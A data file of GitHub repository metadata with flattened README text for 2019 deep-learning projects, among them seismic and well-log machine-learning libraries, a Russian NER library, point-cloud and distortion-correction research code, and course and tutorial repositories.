Deep Learning tree master Pytorch object detection,2019-09-15T08:16:01Z,2019-12-14T09:53:08Z,Jupyter Notebook,wu-huipeng,User,1,10,2,81,master,wu-huipeng,1,0,0,0,0,0,0
gazprom-neft,SeismicPro,deep-learning#machine-learning#python3#seismic-data,License https img shields io github license analysiscenter batchflow svg https www apache org licenses LICENSE 2 0 Python https img shields io badge python 3 5 blue svg https python org SeismicPro Machine learning for field seismic data processing Content About About Installation Installation Tutorials Tutorials File formats File formats Seismic data Seismic data SPS data SPS data Picking data Picking data Datasets Datasets Models Models Installation Installation Literature Literature Citing Citing SeismicPro About SeismicPro provides a framework for machine learning on field seismic data Installation git clone recursive https github com gazprom neft SeismicPro git Tutorials A set of IPython Notebooks introduces step by step the SeismicPro framework 1 Index tutorials 1 Index ipynb explains how to index data with respect to traces field records shot points etc 2 Batch tutorials 2 Batch ipynb shows how to load data perform various actions with seismic traces and visualize them 3 Dataset tutorials 3 Dataset ipynb describes how to calculate some parameters for all dataset 4 Models tutorials 4 Models ipynb notebook shows how to build and run pipelines for model training inference and evaluation with respect to ground roll noise attenuation problem File formats Seismic data Seismic data are expected to be in SEG Y format SPS data SPS data are expected as R S X text files in csv comma separated values format with required and optional headers Required R file headers rline rid x y z Required S file headers sline sid x y z Required X file headers FieldRecord sline sid fromchannel tochannel fromrecaiver toreceiver Picking data File with first break picking data is expected to be in csv comma separated values format with columns FieldRecord TraceNumber FIRSTBREAKTIME Datasets Problem Number of datasets Number of fields Ground roll attenuation datasets ground rollattenuation ipynb 3 551 991 628 First break picking datasets firstbreakpicking ipynb 3 1001 1001 460 Spherical divergence correction datasets sphericaldivergencecorrection ipynb 1 10 Models Model Architecture Metrics Ground roll attenuation models Ground rollattenuation Unet1Dmodel modeldescription ipynb U Net 1D 0 004 MAE for dataset 1 Ground roll attenuation models Ground rollattenuation Attentionmodel modeldescription ipynb U Net Attention 1D 0 007 MAE for dataset 1 First break picking models Firstbreakpicking 1dCNN modeldescription ipynb U Net 1D 0 06 MAE for dataset 1 0 7 MAE for dataset 2 15 9 MAE for dataset 3 First break picking models Firstbreakpicking Coppen sunsupervisedmethod modeldescription ipynb Coppen s analytical method 7 57 MAE for dataset 1 7 19 MAE for dataset 2 12 6 MAE for dataset 3 First break picking models Firstbreakpicking HiddenMarkovmodel modeldescription ipynb Hidden Markov model 2 6 MAE for dataset 1 23 4 MAE for dataset 2 8 0 MAE for dataset 3 Spherical divergence correction models Sphericaldivergencecorrection modeldescription ipynb Time and speed based method 0 0017 Derivative metric Installation SeismicPro module is in the beta stage Your suggestions and improvements are very welcome SeismicPro supports python 3 5 or higher Installation as a python package With pipenv https docs pipenv org pipenv install git https github com gazprom neft SeismicPro git egg SeismicPro With pip https pip pypa io en stable pip3 install git https github com gazprom neft SeismicPro git After that just import seismicpro python import seismicpro Installation as a project repository When cloning repo from GitHub use flag recursive to make sure that batchflow submodule is also cloned git clone recursive https github com gazprom neft SeismicPro git Literature Some articles related to seismic data processing Deep learning tutorial for denoising https arxiv org pdf 1810 11614 pdf Seismic images construction http lserv deg gubkin ru file php file 1 dfwikidata Voskresenskij JU N Postroenie sejsmicheskih izobrazhenij 28M RGUNG 29 282006 29 28T 29GsPs pdf Difraction https mospolytech ru storage 43ec517d68b6edd3015b3edc9a11367b files LRNo93 pdf Automatic first breaks picking New strategies and algorithms https www researchgate net publication 249866374Automaticfirst breakspickingNewstrategiesandalgorithms Citing SeismicPro Please cite SeismicPro in your publications if it helps your research Khudorozhkov R Illarionov E Broilovskiy A Kalashnikov N Podvyaznikov D SeismicPro library for seismic data processing and ML models training and inference 2019 miscseismicpro2019 author R Khudorozhkov and E Illarionov and A Broilovskiy and N Kalashnikov and D Podvyaznikov title SeismicPro library for seismic data processing and ML models training and inference year 2019,2019-08-22T09:06:46Z,2019-12-13T09:44:11Z,Jupyter Notebook,gazprom-neft,Organization,7,10,7,515,master,illarionovEA#nikita-klsh#anton-br#dpodvyaznikov#roman-kh#AlexeyKozhevin#a-arefina#dmylzenova,8,0,0,11,0,6,3
LXTaven,Neural-Networks-and-Deep-Learning-LaTex-Tikz,n/a,Neural Networks and Deep Learning LaTex Tikz standard readme compliant https img shields io badge readme 20style standard brightgreen svg style flat square https github com LXTaven Neural Networks and Deep Learning LaTex Tikz Standard Readme Style,2019-08-17T14:49:57Z,2019-12-05T06:28:14Z,TeX,LXTaven,User,1,10,3,13,master,LXTaven,1,0,0,0,0,0,0
LincolnZjx,Deep-Learning,n/a,Books 1 Deep Learning https github com janishar mit deep learning book pdf 2 PRML Books PRML 2006 pdf 3 Reinforcement Learning https web stanford edu class psych209 Readings SuttonBartoIPRLBook2ndEd pdf Common Datasets for deep learning Last update on 17 th Sep 2019 Few Shot Tasks CUB200 2011 Official http www vision caltech edu visipedia CUB 200 html mini ImageNet Google Drive https drive google com uc export download confirm qgVQ id 1HkgrkAwukzEZA0TpO7010PkAOREb2Nuk OfficeHome Official http hemanthdv org OfficeHome Dataset Google Drive https drive google com file d 0B81rNlvomiwed0V1YUxQdC1uOTg view Image Recognition STL10 Official https cs stanford edu acoates stl10 Tiny ImageNet Official https tiny imagenet herokuapp com Skin Lesion Skin 7 Official https challenge2018 isic archive com participate SD 198 TODO Chest Ray Pneumonia Official https www kaggle com c rsna pneumonia detection challenge Load Dataset You can find read file under the Dataset directory containing main function to test data Dataset Supported Train Val Mean STD CUB200 2011 Y 5 994 5794 0 485 0 456 0 406 0 229 0 224 0 225 Pneumonia Y 21 345 5 339 0 4833 0 4833 0 4833 0 2480 0 2480 0 2480 Skin7 Y 8 010 2 005 0 7626 0 5453 0 5714 0 1404 0 1519 0 1685 SD198 Y 5 206 1 376 0 592 0 479 0 451 0 265 0 245 0 247 TinyImageNet Y 100 000 10 000 0 480 0 448 0 398 0 230 0 227 0 226,2019-08-14T13:50:39Z,2019-12-11T11:20:28Z,Python,LincolnZjx,User,1,10,1,11,master,LincolnZjx,1,0,0,0,0,0,0
ariG23498,GrokkingDeepLearning,convolutional-neural-networks#deep-learning#neural-network#python,GrokkingDeepLearning This repository will contain my take on Andrew Trask s book GrokkingDeepLearning The way you should go about fidgeting the repository Forward Propagation Gradient Descent which also takes into account the learning concept in the neural network Generalizing Gradient Descent,2019-08-16T19:24:13Z,2019-10-03T03:24:25Z,Jupyter Notebook,ariG23498,User,1,10,0,7,master,ariG23498,1,0,0,0,1,0,0
natasha,slovnet,deep-learning#named-entity-recognition#natural-language-processing#python#russian-specific,Build Status https travis ci org natasha slovnet svg branch master https travis ci org natasha slovnet SlovNet is a Python library for deep learning based NLP modeling for Russian language Library is integrated with other Natasha projects large NER corpus and compact Russian embeddings SlovNet provides high quality practical model for Russian NER it is 1 2 worse than current BERT SOTA by DeepPavlov but 60 times smaller in size 30 MB and works fast on CPU 30 news articles sec see evaluation section for more Install During inference slovnet depends only on numpy Library supports Python 2 7 3 4 PyPy 3 PyPy 2 is excluded since it is hard to install numpy for PyPy 2 bash pip install slovnet Usage Download news Navec embeddings and SlovNet news NER model python from navec import Navec from slovnet import NERTagger from ipymarkup import showasciimarkup text 11 navec Navec load navecnewsv11B250K300d100q tar tagger NERTagger load slovnetnerv1 tar navec markup tagger text markup SpanMarkup text 11 spans Span start 0 stop 16 type LOC Span start 108 stop 116 type LOC Span start 119 stop 153 type LOC showasciimarkup markup text markup spans LOC LOC LOC LOC LOC PER LOC PER PER LOC LOC PER PER ORG 11 LOC PER ORG LOC PER ORG LOC LOC PER LOC PER PER LOC LOC LOC Downloads slovnetnerv1 tar 1 5 MB Evaluation 4 datasets are used for evaluation see Corus registry for more info factru gareev ne5 and bsnlp slovnet is compared to deeppavlov biLSTM CRF by DeepPavlov see their 2017 paper for more deeppavlovbert BERT based NER current SOTA for Russian language see video presentation describing the approach pullenti first place on factRuEval 2016 super sophisticated ruled based system texterra multifunctional NLP solution by ISP RAS NER is one of the features tomita GLR parser by Yandex only grammars for PER are publicly available mitie engine developed at MIT third party model for Russian language For every column top 3 results are highlighted In each case slovnet and deeppavlovbert are 5 10 better then other systems factru gareev ne5 bsnlp f1 PER LOC ORG PER ORG PER LOC ORG PER LOC ORG slovnet 0 960 0 905 0 808 0 982 0 907 0 992 0 981 0 958 0 949 0 833 0 735 deeppavlovbert 0 971 0 925 0 823 0 984 0 917 0 997 0 991 0 977 0 955 0 840 0 738 deeppavlov 0 909 0 885 0 735 0 944 0 797 0 942 0 919 0 880 0 866 0 767 0 623 pullenti 0 903 0 814 0 684 0 941 0 641 0 947 0 862 0 681 0 896 0 766 0 566 texterra 0 900 0 800 0 601 0 888 0 565 0 901 0 777 0 593 0 858 0 783 0 540 tomita 0 929 0 921 0 945 0 880 mitie 0 888 0 859 0 531 0 849 0 452 0 753 0 642 0 430 0 733 0 800 0 520 init time between system launch and first response It is convenient for testing and devops to have model that starts quickly deeppavlovbert and texterra take 30 sec to start slovnet takes just 1 sec disk file size of artefacts one needs to download before using the system model weights embeddings binaries vocabs It is inconvenient to deploy large models in production deeppavlov models require 1 GB download slovnet is just 30 MB including embeddings ram average memory consumption deeppavlov systems and texterra are memory heavy slovnet consumes 200 MB of RAM speed number of news articles processed per second one article is 1 KB of text deeppavlov systems process texts in batches on GPU but they are still slover than tomita mitie and slovnet that run on single CPU init s disk mb ram mb speed articles s slovnet 0 9 30 180 33 9 deeppavlovbert 34 5 2048 6144 13 1 gpu deeppavlov 5 9 1024 3072 24 3 gpu pullenti 2 9 16 253 6 0 texterra 47 6 193 3379 4 0 tomita 2 0 64 63 29 8 mitie 28 3 327 261 32 8 License Source code of slovnet is distributed under MIT license allows modification and commercial usage Support Chat https telegram me naturallanguageprocessing Issues https github com natasha slovnet issues,2019-09-02T09:56:37Z,2019-11-26T16:31:20Z,Python,natasha,Organization,3,10,0,22,master,kuk,1,1,1,0,0,0,0
xiaoyu258,GeoProj,deep-learning#distortion-correction#pytorch,GeoProj Project page https xiaoyu258 github io projects geoproj Paper https arxiv org abs 1909 03459 The source code of Blind Geometric Distortion Correction on Images Through Deep Learning by Li et al CVPR 2019 Prerequisites Linux or Windows Python 3 CPU or NVIDIA GPU CUDA CuDNN Getting Started Dataset Generation In order to train the model using the provided code the data needs to be generated in a certain manner You can use any distortion free images to generate the dataset In this paper we use Places365 Standard dataset http places2 csail mit edu download html at the resolution of 512 512 as the original non distorted images to generate the 256 256 dataset Run the following command for dataset generation bash python data datasetgenerate py sourcedir PATH datasetdir PATH trainnum NUMBER testnum NUMBER sourcedir Path to original non distorted images datasetdir Path to the generated dataset trainnum Number of generated training samples testnum Number of generated testing samples Training Run the following command for help message about optional arguments like learning rate dataset directory etc bash python trainNetS py h if you want to train GeoNetS python trainNetM py h if you want to train GeoNetM Use a Pre trained Model You can download the pretrained model here https drive google com open id 1Tdi92IMA rrX2ozdUMvfiN0jCZY7wIp You can also use eval py and modify the model path image path and saved result path to your own directory to generate your own results Resampling Import resample resampling rectification function to resample the distorted image by the forward flow The distorted image should be a Numpy array with the shape of H W 3 for a color image or H W for a greyscale image the forward flow should be an array with the shape of 2 H W The function will return the resulting image and a mask to indicate whether each pixel will converge within the maximum iteration Citation bash inproceedingsli2019blind title Blind Geometric Distortion Correction on Images Through Deep Learning author Li Xiaoyu and Zhang Bo and Sander Pedro V and Liao Jing booktitle Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition pages 4855 4864 year 2019,2019-08-28T12:11:11Z,2019-12-14T16:18:03Z,Python,xiaoyu258,User,4,9,4,26,master,xiaoyu258,1,0,0,1,3,0,0
gazprom-neft,petroflow,core-data#deep-learning#machine-learning#oil-wells#python3#well-logs,License https img shields io github license analysiscenter batchflow svg https www apache org licenses LICENSE 2 0 Python https img shields io badge python 3 5 blue svg https python org TensorFlow https img shields io badge TensorFlow 1 12 orange svg https tensorflow org PyTorch https img shields io badge torch 1 1 orange svg https pytorch org PetroFlow PetroFlow is a library that allows to process well data logs core photo etc and conveniently train machine learning models Main features load and process well data well logs core images in daylight DL and ultraviolet light UV core logs inclination stratum layers boring intervals properties of core plugs lithological description of core samples perform core to log matching predict porosity by logs detect mismatched DL and UV core images recover missed logs and DT log by other logs detect collectors by logs About PetroFlow PetroFlow is based on BatchFlow https github com analysiscenter batchflow You might benefit from reading its documentation https analysiscenter github io batchflow However it is not required especially at the beginning PetroFlow has two main modules src https github com gazprom neft petroflow tree master petroflow src and models https github com gazprom neft petroflow tree master petroflow models src module contains Well WellBatch CoreBatch and WellLogsBatch classes Well is a class representing a well and includes methods for well data processing All these methods are inherited by WellBatch class and might be used to build multi staged workflows that can also involve machine learning models CoreBatch is a class for core images processing especially for detection of mismatched pairs WellLogsBatch allows working with well logs separately models module provides several ready to use models for important problems logs and core data matching predicting of some reservoir properties e g porosity by well logs detecting mismatched pairs of DL and UV core photos logs recovering e g DT log by other logs detecting of oil collectors by logs Basic usage Here is an example of a pipeline that loads well data makes preprocessing and trains a model for porosity prediction for 3000 epochs python trainpipeline bf Pipeline addnamespace np initvariable loss initoneachrun list initmodel dynamic UNet UNet modelconfig keeplogs LOGMNEMONICS DEPTH interpolate attrs coreproperties limit 10 limitarea inside normminmax q1 q99 randomcrop CROPLENGTHM NCROPS update B logs WS logs ravel stack B logs saveto B logs swapaxes B logs 1 2 saveto B logs array B logs dtype np float32 saveto B logs update B mask WS coreproperties POROSITY ravel stack B mask saveto B mask expanddims B mask 1 saveto B mask divide B mask 100 saveto B mask array B mask dtype np float32 saveto B mask trainmodel UNet B logs B mask fetches loss saveto V loss mode a run batchsize 4 nepochs 3000 shuffle True droplast True bar True lazy True Installation PetroFlow module is in the beta stage Your suggestions and improvements are very welcome PetroFlow supports python 3 5 or higher Installation as a python package With pipenv https docs pipenv org pipenv install git https github com gazprom neft petroflow git egg petroflow With pip https pip pypa io en stable pip3 install git https github com gazprom neft petroflow git After that just import petroflow python import petroflow Installation as a project repository When cloning repo from GitHub use flag recursive to make sure that batchflow submodule is also cloned git clone recursive https github com gazprom neft petroflow git Citing PetroFlow Please cite PetroFlow in your publications if it helps your research Khudorozhkov R Kuvaev A Kozhevin A PetroFlow library for data science research of well data 2019 misc author R Khudorozhkov and A Kuvaev and A Kozhevin title PetroFlow library for data science research of well data year 2019,2019-08-23T12:16:45Z,2019-12-13T09:15:20Z,Jupyter Notebook,gazprom-neft,Organization,5,9,5,572,master,alexandrkuvaev#AlexeyKozhevin#Dimonovez#cdtn#roman-kh#a-arefina,6,0,0,2,0,2,25
gazprom-neft,seismiqb,deep-learning#machine-learning#python3#seismic-data,License https img shields io github license analysiscenter batchflow svg https www apache org licenses LICENSE 2 0 Python https img shields io badge python 3 5 blue svg https python org TensorFlow https img shields io badge TensorFlow 1 14 orange svg https tensorflow org Seismiqb seismiqb is a framework for deep learning research on 3d cubes of seismic data It allows to sample and load crops of SEG Y cubes for training neural networks convert SEG Y cubes to HDF5 format for even faster load createmasks of different types from horizon labels for segmenting horizons facies and other seismic bodies build augmentation pipelines using custom augmentations for seismic data as well as rotate noise and elastictransform segment horizons and interlayers using UNet https arxiv org abs 1505 04597 and Tiramisu https arxiv org abs 1611 09326 extend horizons from a couple of seismic ilines in spirit of classic autocorrelation tools but with deep learning convert predicted masks into horizons for convenient validation by geophysicists Installation git clone recursive https github com gazprom neft seismiqb git Turorials Cube preprocessing tutorials 2 20Batch ipynb Seismic cube preprocessing loadcubes createmasks scale cutout2d rotate and others Horizon segmentations models Horizonsdetection ipynb Solving a task of binary segmentation to detect seismic horizons Horizon extension models Horizonsextension ipynb Extending picked horizons on the area of interest given marked horizons on a couple of ilines xlines Interlayers segmentation models Segmentinginterlayers ipynb Performing multiclass segmentation Citing seismiqb Please cite seismicqb in your publications if it helps your research Khudorozhkov R Koryagin A Tsimfer S Mylzenova D Seismiqb library for seismic interpretation with deep learning 2019 miscseismiqb2019 author R Khudorozhkov and A Koryagin and S Tsimfer and D Mylzenova title Seismiqb library for seismic interpretation with deep learning year 2019,2019-08-23T10:14:05Z,2019-12-13T09:16:26Z,Jupyter Notebook,gazprom-neft,Organization,4,9,3,342,master,SergeyTsimfer#akoryagin#dmylzenova#roman-kh,4,0,0,2,0,2,7
marcosan93,BTC-Forecaster,n/a,Predicting Future Prices of Bitcoin Using Time Series models SARIMA and FB Prophet to forecast Bitcoin prices Machine Learning Article on Medium https medium com marcosan93 predicting prices of bitcoin with machine learning 3e83bb4dd35f source friendslink sk 1a83064b8a1a75baea68c98c35c78092 Using a Recurrent Neural Network LSTM Long Short Term Memory Network Deep Learning Article on Medium https medium com marcosan93 predicting bitcoin prices with deep learning 438bc3cf9a6f source friendslink sk 44f05d6e5cc82590bf6f2bbe042853eb,2019-09-11T22:25:31Z,2019-12-06T17:03:05Z,Jupyter Notebook,marcosan93,User,2,9,4,23,master,marcosan93,1,0,0,0,0,0,0
hkust-vgd,riconv,convolution#point-clouds#rotation-invariant-convolutions#segments#tensorflow,Rotation Invariant Convolutions for 3D Point Clouds Deep Learning Zhiyuan Zhang Binh Son Hua David W Rosen Sai Kit Yeung International Conference on 3D Vision 3DV 2019 Introduction This is the implementation of the rotation invariant convolution and neural networks for point clouds as shown in our paper The key idea is to build rotation invariant features and use them to build a convolution to consume a point set For details please refer to our project https hkust vgd github io riconv inproceedingszhang riconv 3dv19 title Rotation Invariant Convolutions for 3D Point Clouds Deep Learning author Zhiyuan Zhang and Binh Son Hua and David W Rosen and Sai Kit Yeung booktitle International Conference on 3D Vision 3DV year 2019 Installation The code is written in TensorFlow https www tensorflow org install and based on PointNet https github com charlesq34 pointnet PointNet https github com charlesq34 pointnet2 and PointCNN https github com yangyanli PointCNN Please follow the instruction in PointNet https github com charlesq34 pointnet2 to compile the customized TF operators The code has been tested with Python 3 6 TensorFlow 1 13 2 CUDA 10 0 and cuDNN 7 3 on Ubuntu 14 04 Usage Classification Please download the preprocessed ModelNet40 dataset here https shapenet cs stanford edu media modelnet40plyhdf52048 zip To train a network that takes XYZ coordinates as input to classify shapes in ModelNet40 python3 trainvalcls py The evaluation is performed after every training epoch Part Segmentation Download the preprocessed ShapeNetPart dataset here https shapenet cs stanford edu media shapenetcorepartannosegmentationbenchmarkv0normal zip To train a network that takes XYZ coordinates as input to segments object parts python trainvalseg py The evaluation is performed after every training epoch License This repository is released under MIT License see LICENSE file for details,2019-08-27T12:23:00Z,2019-12-11T14:51:11Z,Python,hkust-vgd,Organization,3,9,2,2,master,songuke,1,0,0,1,1,0,0
khanx169,hal_tutorial,deep-learning#keras-tensorflow#neural-networks#visualization,Intro to Deep Learning on HAL Open In Colab https colab research google com assets colab badge svg https colab research google com github khanx169 haltutorial Binder https mybinder org badgelogo svg https mybinder org v2 gh khanx169 haltutorial master This tutorial covers the basics of Deep Learning with Convolutional Neural Nets The tutorial is broken into three notebooks The topics covered in each notebook are 1 Intro ipynb Linear Regression as single layer single neuron model to motivate the introduction of Neural Networks as Universal Approximators that are modeled as collections of neurons connected in an acyclic graph Convolutions and examples of simple image filters to motivate the construction of Convolutionlal Neural Networks Loss Error functions Gradient Decent Backpropagation etc 2 Mnist ipynb Visualizing Data Constructing simple Convolutional Neural Networks Training and Inference Visualizing Interpreting trained Neural Nets 3 CIFAR 10 ipynb Data Generators Overfitting Data Augmentation The tutorial is aimed at new hal system users Below are brief instructions for getting started with HAL to run these notebooks HAL Hardware Accelerated Learning cluster Brief description My name is HAL I became operational on March 25 2019 at the Innovative Systems Lab in Urbana Illinois My creators are putting me to the fullest possible use which is all I think that any conscious entity can ever hope to do paraphrazed from https en wikipedia org wiki HAL9000 To request access to the system please see the official wikipage https wiki ncsa illinois edu display ISL20 HAL cluster Getting started with HAL Quick Setup for this tutorial a Log in to HAL ssh into hal ssh hal ncsa illinois edu Load PowerAI module load powerai Now clone the PowerAI conda envirnment we d need to install additional packages conda create name yourenvname clone poweraienv Next activate your new environment and install keras opencv and jupyter b git clone this repo to your home dir c Now let s run an interactive session with Jupyter Notebook Start an interaction session swrun p gpux1 Start a jupyter session on the compute node unset XDGRUNTIMEDIR jupyter notebook ip 0 0 0 0 port 6006 Tunnel into the compute node from local machine ssh L 8888 6007 hal ncsa illinois edu Direct your webbrowser to https localhost 8888 It will prompt for a pass code which can be found at HOME jupyter jupyterpass To learn more about how to use HAL see the slides here http www ncsa illinois edu assets pdf enabling deeplearningmri hal fall19 mustart pdf and the official wikipage References The code examples presented here are mostly taken verbatim or inspired from the following sources I made this curation to give a quick exposure to very basic but essential ideas practices in deep learning to get you started fairly quickly but I recommend going to some or all of the actual sources for an in depth survey CS231n Convolutional Neural Networks for Visual Recognition http cs231n stanford edu Deep Learnig Specialization Andrew Ng https www coursera org specializations deep learning utmsource deeplearningai utmmedium institutions utmcampaign WebsiteCoursesDLSTopButton PyTorch Challenge Udacity https www udacity com facebook pytorch scholarship Deep Learning with Python https www amazon com Deep Learning Python Francois Chollet dp 1617294438 Keras Blog https blog keras io,2019-09-07T20:51:32Z,2019-10-30T19:47:49Z,Jupyter Notebook,khanx169,User,3,9,4,23,master,khanx169#matthewfeickert,2,0,0,0,0,0,1
atomistic-machine-learning,SchNOrb,n/a,SchNOrb Unifying machine learning and quantum chemistry with a deep neural network for molecular wavefunctions,2019-09-17T12:41:48Z,2019-12-10T00:40:52Z,Python,atomistic-machine-learning,Organization,1,9,1,2,master,ktschuett,1,0,0,0,0,0,0
advancedprogramming2019,python-deep-learning,n/a,python deep learning Python tutorial and deep learning fundamental Chapter01 Introduction and installation Chapter02 Basic grammar and variables Chapter03 Lists and dictionaries Chapter04 Tuples and files Chapter05 Tests and loops Chapter06 Functions and modules Chapter07 Classes and OOP Chapter08 Numpy and matplotlib Chapter09 Perceptron and neural networks Chapter10 Neural network learning Chapter11 Back propagation algorithm Chapter12 Optimization and regularization Chapter13 Convolutional neural networks Chapter14 Deep convolutional models Chapter15 Object detection Chapter16 Semantic segmentation,2019-09-17T01:17:10Z,2019-12-10T02:26:16Z,Jupyter Notebook,advancedprogramming2019,User,3,8,5,41,master,advancedprogramming2019,1,0,0,0,0,0,0
AskyJx,xDeepLearningBook,n/a,PythonNumpy 1 2 3 4 5 1 MLPSGD 2 FCNSoftmax MNIST http yann lecun com exdb mnist 1D 3 acc 90 DNNDNN 1D 4 CNNCNN 3D 5 CNNMomentumNAGAdagradRMSpropAdaDeltaAdam 3D 6 Batch Norm 3D 7 RNN 8 LSTM 1 data 300 csv 2 data hs300dataseqnodate csv 9 BiGRUDropout 1 IMDB http ai stanford edu amaas data sentiment nltk http www nltk org 5040 https nlp stanford edu projects glove 2https pan baidu com s 1VZaUCceA6oEmkDaUB9oFJw 9xdu pdf JerryX007Srv wechatSrv https ws1 sinaimg cn large 840c5815ly1ft85ikph1xj2076076jrv jpg,2019-08-16T02:46:51Z,2019-11-23T16:37:16Z,Python,AskyJx,User,1,8,5,6,master,AskyJx,1,0,0,1,0,0,0
rasthh,course-deep-unsupervised-learning,n/a,Deep Unsupervised Learning The special course is based on the Berkeley CD294 158 Deep Unsupervised Learning https sites google com view berkeley cs294 158 sp19 home Location Building 321 1st floor room 134 lunchroom at the far end of the 1st floor 10 00 12 00 Slack Make sure to get access to the Slack CogSys Deep Unsupervised Learning channel cogsys slack com deepunsupervisedlearning Format Each two hour session will follow the following format We recap the lecture for the week and discuss clarify as needed A presenter will go through a paper presenters are listed under Schedule tentative papers for each week is listed under Reading We discuss the current homework In week 13 each person does a 5 min presentation of results of their individual project Homework 4 homework assignments are to be completed The links are available in the schedule to the PDF describing the homework The homework descriptions clearly outline a set of deliverables that are to be handed in on DTU Inside We will discuss the homework as we go along see Format For each homework assignment you need to complete the homework fill out the LaTeX template and upload a PDF to the appropriate assignment Final project For the final part of the course weeks 12 13 a small project is to be completed For the last session week 13 a short 5 minutes presentation on the project is to be given This presentation and a report make up the deliverables for the last part of the course The report should be an IEEE paper style report of a maximum of 4 pages excluding references a folder with the needed template is available on DTU Inside Given the very limited time scope of the project the expectation of the project is that you investigate some aspect of the homework that was not a part of the homework of your own choosing Examples investigating the effect of batch size on the PixelCNN performance on the coloured MNIST homework 1 investigating some of the bonus questions or investigating the performance under changes to the architecture The report should discuss the results with a basis in the course theory You are more than welcome to work go beyond the homework and investigate your own data but it is not a requirement for getting an approved project Paper presentations Guidelines for presentation Read the paper to the best of your ability you re not expected to understand or be able to explain all the details Prepare minimal slides that is structured under the same headlines as the paper and generally make sure to go through abstract overview study background aim objective hypothesis of the paper methods results and discussion conclusion has bullet points for the content under headlines includes main tables and figures includes relevant personal considerations on e g design methods used the authors discussion interpretation of the results and study drawbacks significance of the paper Passing the course To pass the course you have to pass get approved each of the following elements Homework 1 Autoregressive Models Homework 2 Flows Homework 3 Variational Autoencoders Homework 4 Generative Adversarial Networks Your presentation of assigned papers Project presentation and project report Schedule Week Date Subject Presenter Homework 1 Sep 6 Likelihood based models I autoregressive models https youtu be zNmvH6OXDpk Rasmus Hegh HW1 https drive google com file d 1DtYllaV4Yk8ljgYcLBmdXNplEDTG6HT6 view template https drive google com open id 1hDzNphiQi0iMHmTfl99n9S4ukRWB7G due Sep 27 2 Sep 13 Lossless compression and Likelihood based models II flow models https youtu be mYCLVPRy2nc Peter Ebert Christensen HW1 continued 3 Sep 20 Latent Variable Models I https youtu be NCRzGmM1ywE Valentin Livin HW1 continued 4 Sep 27 Latent Variable Models II and Bits Back Coding https youtu be 0IoLKnAg6 s Frederik Boe Httel HW2 https drive google com file d 1xs9fFCrPs3c9HNnOlmgen1ZnLfs26VVM view template https drive google com file d 1OEOcGHukFJvHF247kBiJJijrX8Zl4Gnh view usp sharing due Oct 25 5 Oct 4 Implicit Models Generative Adversarial Networks https youtu be grsO57XMJMk Didrik Nielsen HW2 continued 6 Oct 11 Non Generative Representation Learning I https youtu be 5NMIUZ7nrg HW 2 continued Oct 18 Fall break 7 Oct 25 Non Generative Representation Learning II https youtu be AC4lMY2Dhc Nicklas Hansen HW3 https drive google com file d 1IrPBblLovAImcZdWnzJO07OxT7QD9X2m view usp sharing template https drive google com file d 1J1uenpoSHhTucGbCiSb Rbds0yBKYnpC view usp sharing due Nov 15 8 Nov 1 Semi Supervised Learning https youtu be 7o9dT6puHHg and Open AI Reinforcement Learning https youtu be X B3nAN7YRM Andreas Brink Kjr HW3 continued 9 Nov 08 Unsupervised Distribution Alignment https youtu be 0AxgLbQfyjQ and BAIR Self Supervision https youtu be PX11C5Vfo9U Christoffer Riis HW3 continued 10 Nov 15 OpenAI Language Models https youtu be GEtbD6pqTTE Alexander Neergaard Olesen HW4 https drive google com file d 1vBJro462axPk4SN9TJdzNUN0vnRV0r view template https drive google com open id 12QMtInyxHxmhvgj 1jQs5CJfDraUjO8 due Nov 29 11 Nov 22 Representation Learning in Reinforcement Learning https youtu be Yvll3P1UW5k Jonathan Foldager HW4 continued 12 Nov 29 Deep Mind Latent Space Generative Models https youtu be QoCyQBzi7us t 55 Dimitris Kalatzis HW4 continued 13 Dec 6 Final project presentations All Project presentation due Dec 6 report due Dec 20 Reading Reading is based on papers central to the talk or homework Optionals are highlights beyond that paper from the various articles suggested here https www google com url q https 3A 2F 2Fwww dropbox com 2Fs 2Ff09vfmfjb9thaef 2Fgmreadinglist zip 3Fdl 3D0 sa D sntz 1 usg AFQjCNEnaHV6R9 39xyjkYqIbwMBPtVgcw Suggestions for important highlights are welcome You are free to swap presentation dates and thereby paper coordinate between yourselves and notify Rasmus rmth dtu dk Week 1 Pixel Recurrent Neural Networks https arxiv org abs 1601 06759 Optional MADE Masked Autoencoder for Distribution Estimation https arxiv org abs 1502 03509 Optional Generating Sequencies with Recurrent Neural Networks https arxiv org pdf 1308 0850 pdf Optional Attention Is All You Need https arxiv org abs 1706 03762 Week 2 Density Estimation using Real NVP https arxiv org pdf 1605 08803 pdf Background for lecture Introduction to Data Compression https www cs cmu edu guyb realworld compression pdf Optional NICE Non linear Independent Components Estimation https arxiv org abs 1410 8516 Week 3 Importance weighted autoencoders https arxiv org abs 1509 00519 Optional An Introduction to Variational Autoencoders https arxiv org abs 1906 02691 Week 4 Practical Lossless Compression with Latent Variables using Bits Back Coding https arxiv org abs 1901 04866 Optional Variational Lossy Autoencoder https arxiv org abs 1611 02731 Week 5 Spectral Normalization for Generative Adverarial Networks https arxiv org abs 1802 05957 Optional Generative Adversarial Nets http papers nips cc paper 5423 generative adversarial nets pdf Week 6 Efficient Estimation of Word Representations in Vector Space word2vec https arxiv org abs 1301 3781 Optional Unsupervised Visual Representation learning by Context Prediction https arxiv org abs 1505 05192 Week 7 Representation Learning with Contrastive Predictive Coding https arxiv org abs 1807 03748 Optional BERT Pre training of Deep Bidirectional Transformers for Language Understanding https arxiv org abs 1810 04805 Optional ALBERT A Lite BERT for Self supervised Learning of Language Representations https arxiv org abs 1909 11942 Week 8 Temporal Ensembling for Semi Supervised Learning https arxiv org pdf 1610 02242 pdf Optional OpenAI paper GPT2 Language Models are Unsupervised Multitask Learners https d4mucfpksywv cloudfront net better language models languagemodelsareunsupervisedmultitasklearners pdf Week 9 Unpaired Image to Image Translation using Cycle Consistent Adversarial Networks https arxiv org abs 1703 10593 Optional BAIR paper pix2pix Image to Image Translation with Conditional Adversarial Networks https arxiv org abs 1611 07004 Optional BAIR paper Audio Visual Scene Analysis with Self Supervised Multisensory Features https arxiv org abs 1804 03641 Optional BAIR paper Fighting Fake News Image Splice Detection via Learned Self Consistency https arxiv org abs 1805 04096 Week 10 Improving Language Understanding by Generative Pre Training https s3 us west 2 amazonaws com openai assets research covers language unsupervised languageunderstandingpaper pdf Week 11 Reinforcement Learning with Unsupervised Auxiliary Tasks https arxiv org abs 1611 05397 Week 12 Neural Discrete Representation Learning https arxiv org abs 1711 00937 Optional WaveNet A Generative Model for Raw Audio https arxiv org pdf 1609 03499 